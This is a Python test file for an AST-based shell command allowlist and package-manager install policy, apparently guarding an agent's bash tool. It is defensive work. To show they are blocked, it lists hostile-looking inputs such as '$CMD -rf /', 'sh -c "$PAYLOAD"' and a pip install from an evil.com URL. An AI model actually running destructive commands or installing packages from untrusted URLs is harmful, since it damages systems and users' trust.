"""Tests for the AST-based command allowlist and package-manager policy."""

import os
import sys

import pytest

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))

from src.mcp.servers.tasks.os.bash.command_policy import (  # noqa: E402
    DEFAULT_ALLOWED_COMMANDS,
    CommandParseError,
    check_command,
    parse_commands,
)

A = DEFAULT_ALLOWED_COMMANDS


def allowed(cmd, **kw):
    err = check_command(cmd, A, **kw)
    assert err is None, err


def blocked(cmd, needle=None, **kw):
    err = check_command(cmd, A, **kw)
    assert err is not None, f"expected block: {cmd!r}"
    if needle:
        assert needle in err, err
    return err


# ── AST extraction ─────────────────────────────────────────────────────────


class TestParseCommands:
    def test_simple_command(self):
        cmds = parse_commands("ls -la /tmp")
        assert len(cmds) == 1
        assert cmds[0].argv == ["ls", "-la", "/tmp"]

    def test_pipeline_and_lists(self):
        cmds = parse_commands("cat f | grep x && echo ok; wc -l f")
        assert [c.argv[0] for c in cmds] == ["cat", "grep", "echo", "wc"]

    def test_command_substitution_extracted(self):
        cmds = parse_commands("echo $(date) `whoami`")
        names = {c.argv[0] for c in cmds}
        assert {"date", "whoami", "echo"} <= names

    def test_nested_substitution(self):
        cmds = parse_commands('echo "$(basename $(pwd))"')
        names = {c.argv[0] for c in cmds}
        assert {"echo", "basename", "pwd"} <= names

    def test_process_substitution(self):
        cmds = parse_commands("diff <(sort a) <(sort b)")
        assert [c.argv[0] for c in cmds].count("sort") == 2

    def test_substitution_in_arithmetic(self):
        cmds = parse_commands("echo $(( $(wc -l < f) + 1 ))")
        assert "wc" in {c.argv[0] for c in cmds}

    def test_loops_and_conditionals(self):
        cmds = parse_commands(
            "for f in a b; do cat $f; done; if [ -f x ]; then echo y; fi")
        names = [c.argv[0] for c in cmds]
        assert "cat" in names and "[" in names and "echo" in names
        assert "for" not in names and "if" not in names

    def test_leading_assignments_stripped(self):
        cmds = parse_commands("GIT_PAGER=cat git log")
        assert cmds[0].argv[0] == "git"

    def test_quoted_value_assignment_stripped(self):
        cmds = parse_commands('MSG="hello world" echo ok')
        assert cmds[0].argv[0] == "echo"

    def test_quoted_assignment_lookalike_is_command(self):
        # "FOO=bar" (fully quoted) executes a program named FOO=bar.
        cmds = parse_commands('"FOO=bar" arg')
        assert cmds[0].argv[0] == "FOO=bar"

    def test_redirect_targets_are_not_words(self):
        cmds = parse_commands("echo hi > out.txt 2>&1")
        assert cmds[0].argv == ["echo", "hi"]

    def test_stripped_heredoc_form(self):
        cmds = parse_commands("cat << 'EOF'")
        assert cmds[0].argv == ["cat"]

    def test_dynamic_command_position_flagged(self):
        cmds = parse_commands("$CMD -rf /")
        assert cmds[0].words[0].has_expansion

    def test_case_raises(self):
        with pytest.raises(CommandParseError):
            parse_commands("case $x in a) ls;; esac")

    def test_function_definition_raises(self):
        with pytest.raises(CommandParseError):
            parse_commands("f() { ls; }")

    def test_arithmetic_command_raises(self):
        with pytest.raises(CommandParseError):
            parse_commands("((x++))")

    def test_unterminated_quote_raises(self):
        with pytest.raises(CommandParseError):
            parse_commands("echo 'unterminated")

    def test_escaped_semicolon_is_literal(self):
        cmds = parse_commands(r"find . -name '*.py' -exec rm {} \;")
        assert len(cmds) == 1
        assert cmds[0].argv[0] == "find"


# ── allowlist enforcement ──────────────────────────────────────────────────


class TestAllowlist:
    def test_common_commands_allowed(self):
        for cmd in ("ls -la", "git status", "python3 script.py",
                    "cat f | grep x | sort | uniq -c",
                    "curl -s https://example.com -o out.json",
                    "tar czf out.tgz dir/", "make -j4",
                    "timeout 5 sleep 10", "xargs -I {} cp {} /dest",
                    "awk '{print $1}' file", "pip list", "npm ls"):
            allowed(cmd)

    def test_unknown_executable_blocked(self):
        blocked("evilbin --do-bad", "allowlist")

    def test_unknown_executable_in_substitution_blocked(self):
        blocked("echo $(evilbin)", "allowlist")

    def test_unknown_executable_in_pipeline_blocked(self):
        blocked("cat f | evilbin", "allowlist")

    def test_dynamic_command_name_blocked(self):
        blocked("$CMD -rf /", "dynamic")

    def test_wrapper_does_not_hide_command(self):
        blocked("nohup evilbin &", "allowlist")
        blocked("timeout 5 evilbin", "allowlist")
        blocked("xargs evilbin", "allowlist")
        blocked("env FOO=1 evilbin", "allowlist")

    def test_shell_dash_c_recursed(self):
        allowed("bash -c 'ls /tmp'")
        blocked("bash -c 'evilbin'", "allowlist")
        blocked('sh -c "$PAYLOAD"', "dynamic")

    def test_find_exec_target_checked(self):
        allowed(r"find . -name '*.pyc' -exec rm {} \;")
        blocked(r"find . -exec evilbin {} \;", "allowlist")

    def test_parse_failure_fails_closed(self):
        blocked("case $x in a) ls;; esac", "statically")

    def test_versioned_interpreters_normalized(self):
        allowed("python3.12 -V")
        allowed("/usr/bin/python3 -m venv env")

    def test_extended_allowlist(self):
        custom = A | frozenset({"mytool"})
        assert check_command("mytool --run", custom) is None


# ── package-manager policy ─────────────────────────────────────────────────


class TestPackagePolicy:
    def test_installs_blocked_by_default(self):
        blocked("pip install requests", "disabled by default")
        blocked("pip3 install requests", "disabled by default")
        blocked("python -m pip install requests", "disabled by default")
        blocked("npm install left-pad", "disabled by default")
        blocked("npx cowsay", "disabled by default")
        blocked("gem install rails", "disabled by default")
        blocked("cargo install ripgrep", "disabled by default")
        blocked("go install golang.org/x/tools/cmd/goimports", "disabled")
        blocked("uv pip install flask", "disabled by default")

    def test_non_mutating_subcommands_allowed(self):
        allowed("pip list")
        allowed("pip freeze")
        allowed("pip show requests")
        allowed("npm ls")
        allowed("npm run build")
        allowed("cargo build")
        allowed("go build ./...")

    def test_system_package_managers_not_in_allowlist(self):
        blocked("apt-get install curl", "allowlist")
        blocked("brew install jq", "allowlist")
        blocked("apk add git", "allowlist")

    def test_pinned_installs_allowed_when_enabled(self):
        allowed("pip install requests==2.31.0", allow_installs=True)
        allowed("pip install 'requests[socks]==2.31.0'", allow_installs=True)
        allowed("python -m pip install numpy==1.26.4", allow_installs=True)
        allowed("npm install left-pad@1.3.0", allow_installs=True)
        allowed("npm install @scope/pkg@1.0.0", allow_installs=True)
        allowed("npx cowsay@1.5.0 hi", allow_installs=True)
        allowed("gem install rails -v 7.0.0", allow_installs=True)
        allowed("cargo install ripgrep@14.1.0", allow_installs=True)
        allowed("go install golang.org/x/tools/cmd/goimports@v0.24.0",
                allow_installs=True)
        allowed("uv pip install flask==3.0.0", allow_installs=True)

    def test_unpinned_installs_blocked_when_enabled(self):
        blocked("pip install requests", "not version-pinned",
                allow_installs=True)
        blocked("pip install requests>=2.0", "not version-pinned",
                allow_installs=True)
        blocked("npm install left-pad", "not version-pinned",
                allow_installs=True)
        blocked("npx cowsay", "not version-pinned", allow_installs=True)
        blocked("gem install rails", "pinned", allow_installs=True)
        blocked("cargo install ripgrep", "pinned", allow_installs=True)

    def test_requirements_files_blocked(self):
        blocked("pip install -r requirements.txt", "pin-verified",
                allow_installs=True)
        blocked("pip install -e .", "pin-verified", allow_installs=True)

    def test_urls_and_paths_blocked(self):
        blocked("pip install git+https://github.com/x/y",
                allow_installs=True)
        blocked("pip install https://evil.com/pkg.whl", allow_installs=True)
        blocked("pip install ./local-pkg", allow_installs=True)

    def test_dynamic_package_name_blocked(self):
        blocked("pip install $PKG", "literal", allow_installs=True)

    def test_index_url_flag_with_pin_allowed(self):
        allowed("pip install --index-url https://download.pytorch.org/whl/cu126 "
                "torch==2.4.0 torchvision==0.19.0", allow_installs=True)

    def test_lockfile_installs_allowed(self):
        allowed("npm ci", allow_installs=True)
        allowed("npm install", allow_installs=True)

    def test_uninstall_gated_but_not_pinned(self):
        blocked("pip uninstall requests", "disabled by default")
        allowed("pip uninstall requests", allow_installs=True)

    def test_env_prefix_does_not_bypass(self):
        blocked("PIP_QUIET=1 pip install requests", "disabled by default")

    def test_shell_c_does_not_bypass(self):
        blocked("bash -c 'pip install requests'", "disabled by default")

    def test_substitution_does_not_bypass(self):
        blocked("echo $(pip install requests)", "disabled by default")
